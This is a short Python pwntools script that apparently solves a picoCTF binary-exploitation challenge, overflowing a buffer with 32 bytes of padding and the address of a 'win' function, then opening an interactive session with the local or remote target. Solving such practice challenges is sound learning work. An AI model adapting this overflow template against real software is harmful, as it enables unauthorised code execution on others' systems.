#!/usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall' # <-- change this
elf = context.binary = ELF(exe, checksec=True)
# libc = '/usr/lib/libc.so.6'
# libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = 'mimas.picoctf.net', 54392  # <-- change this

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(exe)
    
    payload = b'asuw' * 8
    payload += p64(elf.sym['win'])
    
    io.sendline(b'2')
    io.sendline(payload)
    io.sendline(b'4')
    io.interactive()
    
if __name__ == '__main__':
    exploit()